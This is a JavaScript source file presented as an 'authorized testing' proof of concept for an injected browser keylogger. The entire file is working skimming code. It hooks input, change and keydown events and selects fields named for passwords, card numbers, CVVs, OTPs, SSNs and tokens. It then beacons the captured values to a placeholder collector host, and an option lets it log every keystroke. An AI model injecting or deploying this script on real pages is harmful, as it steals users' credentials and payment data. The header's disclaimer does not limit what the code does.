/*
 * keylogger.js — Keystroke / sensitive-field capture PoC (guide §29).
 * Demonstrates ongoing data capture from the victim's session — strongest on login/payment
 * pages where the sensitive value is typed (password, card, CVV, OTP).
 *
 * AUTHORIZED TESTING ONLY. Capture ONLY your own test input to your own collector. Do NOT
 * keylog real users. Scope the capture (default: only sensitive-named fields) to keep the PoC
 * minimal and non-invasive.
 */
(function () {
  var CFG = {
    collector: "//YOUR.oast.fun/k",
    sensitiveOnly: true,                                   // capture only sensitive fields (recommended)
    sensitiveRe: /pass|pwd|card|cc|cvv|cvc|otp|pin|ssn|secret|token|account/i,
    flushMs: 1500
  };

  var buf = [];
  function flush() {
    if (!buf.length) return;
    var chunk = buf.splice(0, buf.length).join("");
    try { navigator.sendBeacon(CFG.collector, chunk); }
    catch (e) { new Image().src = CFG.collector + "?d=" + encodeURIComponent(chunk); }
  }
  setInterval(flush, CFG.flushMs);
  window.addEventListener("beforeunload", flush);

  // Snapshot sensitive fields on input/change (clearest signal for a PoC)
  ["input", "change"].forEach(function (ev) {
    document.addEventListener(ev, function (e) {
      var t = e.target;
      if (!t || !("value" in t)) return;
      var name = (t.name || t.id || t.getAttribute("placeholder") || "").toString();
      if (CFG.sensitiveOnly && !CFG.sensitiveRe.test(name)) return;
      buf.push("[" + name + "=" + t.value + "]");
    }, true);
  });

  // Optional raw keystroke stream (set sensitiveOnly=false to see everything typed)
  if (!CFG.sensitiveOnly) {
    document.addEventListener("keydown", function (e) {
      buf.push(e.key.length === 1 ? e.key : "{" + e.key + "}");
    }, true);
  }
})();
